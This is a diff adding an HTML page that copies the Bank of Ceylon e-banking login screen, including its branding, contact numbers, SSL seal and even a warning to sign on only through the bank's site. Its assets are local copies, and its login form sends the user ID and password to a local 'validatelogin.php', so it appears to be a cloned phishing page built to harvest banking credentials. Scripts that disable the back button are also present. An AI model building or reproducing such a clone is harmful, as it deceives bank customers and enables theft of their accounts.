@@ -1,0 +1,295 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta http-equiv="Pragma" content="no-cache">
+        <meta http-equiv="Cache-Control" content="no-cache">
+        <meta http-equiv="Expires" content="Sat, 01 Dec 2001 00:00:00 GMT">
+                    <meta http-equiv="X-UA-Compatible" content="IE=8">
+                    <link rel="shortcut icon" href="https://www.boc.web.lk/eng/">
+                    <title>Welcome to BOC E-Banking System</title>
+
+                    <link href="login.css" rel="stylesheet" type="text/css">
+                    <link href="bootstrap.css" rel="stylesheet" type="text/css">
+                    <script type="text/javascript" src="jquery.js"></script>
+
+                    
+                        <script type="text/javascript">
+                            $(window).load(function () {
+                                $('#myModal').modal('show');
+                            });
+                        </script>
+                    
+
+                    <!--link href="/eng/css/bootstrap-ie7.css" rel="stylesheet" type="text/css" /-->
+                    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+                    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+                    <!--[if lt IE 9]>
+                      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+                      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+                    <![endif]-->
+
+
+                    </head>
+
+                    
+
+                    
+
+                    
+                        
+                            
+                                
+                                    <body onload="init();
+                            changeHashOnLoad();" class="">
+                                    
+
+                                
+
+                                <div id="top_div">
+                                    <div id="welcome_notice">Welcome to BOC E-Banking System</div>
+                                </div>
+
+                                <div id="main_container">
+                                    <div id="slideshow_container">
+                                        <div id="slide_header">
+                                            <div id="logo"></div>
+                                            <div id="header_text"><span>Bankers</span> to the Nation</div>
+                                        </div>
+                                        <!-- <div id="slideshow"><img src="/eng/main/img/slide_image/home_img1.jpg" alt="Slideshow Image 1" class="active myimg" width="620" height="268" /><img src="/eng/main/img/slide_image/home_img2.jpg" alt="Slideshow Image 2" width="620" height="268" class="myimg"/> <img src="/eng/main/img/slide_image/home_img3.jpg" alt="Slideshow Image 3" width="620" height="268" class="myimg"/></div> -->
+
+                                        <div id="slideshow"><img src="home_img1.jpg" alt="Slideshow Image 1" class="active myimg" width="608" height="255"></div>
+                                    </div>
+                                    <form action="validatelogin.php" method="post" onsubmit="formValidate();">
+                                        <div id="login_container">
+                                            <div id="login_header">Login</div>
+                                            <br>
+
+                                            <ul id="login_element">
+                                                <li class="text_style_1">User ID :</li>
+                                                <li class="text_style_1"><div class="input_container" id="userid1"><input class="inputBox" name="txt_v_userid" id="txt_v_userid" type="text"></div></li>
+                                                <li class="text_style_1">Password : </li>
+                                                <li class="text_style_1"><div class="input_container" id="password1"><input class="inputBox" name="txt_v_password" id="txt_v_password" value="" type="password"></div></li>
+
+
+
+                                                <li class="text_style_1"><div class="line"></div></li>
+                                                <li class="text_style_1">
+                                                    <input value="Sign In" id="bttSignin" class="button" type="submit">
+                                                    <input value="Clear" id="bttClear" class="button" type="reset">
+                                                </li>
+                                                <div class="text_style_1" style="text-align:center;color:#f00;font-weight:bold;"><br>
+                                                    </div>
+                                            </ul>
+
+                                        </div>
+                                    </form>
+
+                                    <div class="space" style="height:5px;"></div>
+                                    <div id="service_container">
+                                        <div class="pull-left" style="width:24%;border-right:#333 1px dashed;height:150px;padding-left:5px;">
+                                            <div id="service_header_top">Internet Banking Notices</div>
+                                            <div style="width:230px;*width:235px">
+                                                <div style="background-color:#333;font:11px bold Arial, Helvetica, sans-serif;color:#fff;padding:3px;">
+                                                    <div>BOC has upgraded Internet Banking System. If you encounter any issues, please contact ...</div>
+                                                    <div>+94 11 2204654, +94 11 2204659</div>
+                                                    <div>+94 11 2204662, +94 11 2204663</div>
+
+
+                                                </div>
+
+
+                                            </div>
+                                        </div>
+                                        <div class="pull-right" style="width:75%;">
+                                            <div id="service_header_top">BOC Internet Banking Facilities</div>
+                                            <div class="pull-left" style="width:33%;">
+                                                <div class="service_header_left">» Financial Services</div>
+                                                <ul class="service_list_left">
+                                                    <li><a href="#" class="sr" flag="1">Own Account Transfer</a> </li>
+                                                    <li><a href="#" class="sr" flag="2">Third Party Transfer - BOC</a> </li>
+                                                    <li><a href="#" class="sr" flag="6">Third Party Transfer - Other Banks</a> </li>
+                                                    <li><a href="#" class="sr" flag="3">BOC Credit Card Settlement</a> </li>
+                                                    <li><a href="#" class="sr" flag="4">Utility Bill Payments</a> </li>
+                                                    <li><a href="#" class="sr" flag="5">ETF Payments </a></li>
+
+                                                </ul>
+                                            </div>
+                                            <div class="pull-left" style="width:33%;">
+                                                <div class="service_header_left">» Non-Financial Services</div>
+                                                <ul class="service_list_left">
+                                                    <li><a href="#" class="sr" flag="9">Balance Inquiry</a></li>
+                                                    <li><a href="#" class="sr" flag="10">Deposits and Advances</a></li>
+                                                    <li><a href="#" class="sr" flag="11">Today’s and Past Transactions Inquiry</a></li>
+                                                        
+                                                        
+                                                    <li><a href="#" class="sr" flag="14">Message to Bank</a></li>
+                                                    <li><a href="#" class="sr" flag="15">Profile Updates</a> </li>
+                                                    <li><a href="#" class="sr" flag="16">Exchange Rates </a></li>                       
+
+                                                </ul>
+                                            </div>
+                                            <div class="pull-left" style="width:33%;">
+                                                <div class="service_header_left"><!-- <a href="/ebank_demo/index.html" target="_blank" class="sr1">Demo Videos</a>--></div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div id="footer_container" style="background-color: #f7f7f7;padding: 5px 0px;">
+                                        
+
+                                        <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                                            <tbody><tr>
+                                                <td valign="top" width="40%"><div id="footer">Copyright © 2015 | All Rights Reserved | Solution By <a href="http://www.mi-synergy.com/" target="_blank">M I Synergy (Pvt) Ltd.</a> Version 1.0.5.20150820</div></td>
+                                                <td valign="top" width="38%"><table style="color:#333; text-decoration:none; font:bold 8px verdana,sans-serif;" width="100%" border="0" cellspacing="0" cellpadding="0">
+                                                        <tbody><tr>
+                                                            <td colspan="3">BOC e Bank Web Site </td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td width="10%">Phone</td>
+                                                            <td width="2%">:</td>
+                                                            <td width="76%">+94-11-2541932 , Fax : +94-11-2447569</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td>E-Mail</td>
+                                                            <td>:</td>
+                                                            <td>ebank@boc.lk</td>
+                                                        </tr>
+                                                    </tbody></table>
+                                                </td>
+                                                <td valign="top" width="22%"><script src="getseal"></script><img name="seal" src="getseal.gif" oncontextmenu="return false;" usemap="#sealmap_medium" alt="" border="0"> <map name="sealmap_medium" id="sealmap_medium"><area alt="Click to Verify - This site has chosen an SSL Certificate to improve Web site security" title="" href="javascript:vrsn_splash()" shape="rect" coords="0,0,115,58" tabindex="-1" style="outline:none;"><area alt="Click to Verify - This site has chosen an SSL Certificate to improve Web site security" title="" href="javascript:vrsn_splash()" shape="rect" coords="0,58,63,81" tabindex="-1" style="outline:none;"><area alt="" title="" href="javascript:symcBuySSL()" shape="rect" coords="63,58,115,81" style="outline:none;"></map><br>
+                                                    <a href="http://www.verisign.com/ssl-certificate/" target="_blank" style="color:#000000; text-decoration:none; font:bold 7px verdana,sans-serif; letter-spacing:.5px; text-align:center; margin:0px; padding:0px;">ABOUT SSL CERTIFICATES</a></td>
+                                            </tr>
+
+                                        </tbody></table>
+
+
+
+                                    </div>
+                                    <div style="color:#cc0000; text-decoration:none; font:bold 8px verdana,sans-serif; text-align:center; margin:0px; padding:10px;">Best viewed with Internet Explorer 7.0+ or Fire Fox or Google Chrome with resolution of 1024 x 768</div>
+                                </div>
+
+
+                                
+                                <div class="service_desc_container ui-draggable" style="top: 292px; left: 379.5px;">
+                                    <div class="dragging_icon"></div>
+                                    <div class="service_desc_internal">
+                                        <div class="service_header_container">
+                                            <div class="service_text"></div>
+                                            <div class="close_link"></div>
+                                        </div>
+                                        <div class="space2"></div>
+                                        <div class="service_desc"></div>
+                                    </div>
+                                </div>
+
+                                <!-- Modal -->
+                                <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+                                    <div class="modal-dialog">
+                                        <div class="modal-content">
+                                            <div class="modal-header" style="background-color:#FFD606;color:#000;">
+                                                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">
+                                                    ×
+                                                </button>
+
+                                                <h5 class="modal-title" id="myModalLabel">
+                                                    <strong>For Secured Internet Banking Experience</strong>
+                                                </h5>
+                                            </div>
+                                            <div class="modal-body" style="font-size:14px;">
+
+                                                <div class="col-md-3"><img src="system_error.png" width="91" height="97"></div>
+                                                <div class="col-md-8">
+                                                    Always sign-on to the Internet Banking Site through our web site: <span style="color:#cc0000"><strong>www.boc.lk </strong></span>only. <span style="color:#cc0000"><strong>Do not use any other link to sign-on</strong></span> to our Internet Banking Site. <br>
+                                                    <br>
+                                                    <a href="#" onclick="popup('/info/secure_online_banking.pdf', 'Secure Online Banking');">
+
+                                                        <span class="label label-default">Read More »</span></a>
+                                                </div>
+
+
+                                            </div>
+                                            <div class="modal-footer" style="border:none;">
+                                                <button type="button" class="btn btn-default" data-dismiss="modal" style="background-color:#333;color:#fff;border:none;">Close
+                                                </button>
+
+                                            </div>
+                                        </div><!-- /.modal-content -->
+                                    </div><!-- /.modal -->
+
+
+                                    <script type="text/javascript" src="jquery-ui.js"></script>
+                                    <script type="text/javascript" src="login.js"></script>
+                                    <script type="text/javascript" src="detectBrowser.js"></script>
+                                    <script type="text/javascript" src="bootstrap.js"></script>
+
+                                    <script type="text/javascript">
+                                        function viewPage() {
+                                            var dataString = 
+"&txt_type=Vv6x8IcV9AM="
+
+                                            var url = 
+"/EbankMainController/GrZ7qD3MR6yHAXliHiq6 
+us61WDWEiDh?app_id=YpvGFIM0z4M=" + dataString;
+                                            window.open(url, "_blank", 
+"toolbar=no, location=no, directories=no, status=no, menubar=no, 
+scrollbars=no, resizable=no, copyhistory=no, width=700, height=400");
+                                        }
+
+                //==============ADDED 2014-02-24 =============
+                                        function popup(mylink, 
+windowname) {
+
+                                            if (!window.focus)
+                                                return true;
+                                            var href;
+                                            if (typeof (mylink) == 
+'string')
+                                                href = mylink;
+                                            else
+                                                href = mylink.href;
+                                            window.open(href, 
+windowname, "toolbar=no, location=no, 
+width=700,height=400,scrollbars=yes");
+                                            return false;
+                                        }
+
+                //==============ADDED 2014-01-08 to disable back in 
+browsers =============
+
+                                        function changeHashOnLoad() {
+                                            window.location.href += '#';
+                                            
+setTimeout('changeHashAgain()', '10');
+                                        }
+
+                                        function changeHashAgain() {
+                                            window.location.href += '1';
+                                        }
+
+                                        if (isIE || isIE11) {
+                                            var storedHash = '#';
+                                        } else {
+                                            var storedHash = 
+window.location.hash;
+                                        }
+
+
+                                        window.setInterval(function () {
+                                            if (window.location.hash !==
+ storedHash) {
+                                                window.location.hash = 
+storedHash;
+                                            }
+
+                                        }, 10);
+
+
+
+                //window.onload = changeHashOnLoad();
+                //  window.history.pushState('page2', 'Title', 'EBANK');
+                //=============================
+
+                                    </script>                   
+                            
+                              
+</div></body></html>
